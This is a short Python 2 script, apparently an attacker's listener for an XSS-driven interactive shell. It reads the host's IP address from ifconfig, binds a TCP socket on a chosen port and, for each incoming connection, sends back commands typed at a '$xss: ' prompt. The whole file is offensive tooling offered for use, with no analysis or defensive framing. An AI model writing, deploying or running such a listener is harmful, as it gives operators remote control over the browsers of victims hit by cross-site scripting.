import socket
import os
import sys

args = sys.argv

if len(args) == 1:
	exit("Format is as follows:\npython xss.py -p PORT")

port = 1234

for arg in args:
	if arg == "-p":
		port = args[args.index(arg) + 1]

cmd = os.popen('ifconfig | grep "inet addr:"').read()

ip = cmd.split('\n')[1].split()[1].split(':')[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((ip, int(port)))
s.listen(1)


while 1:
	conn, addr = s.accept()
	data = conn.recv(1024)
	out = raw_input("$xss: ")
	conn.send(out)

s.close
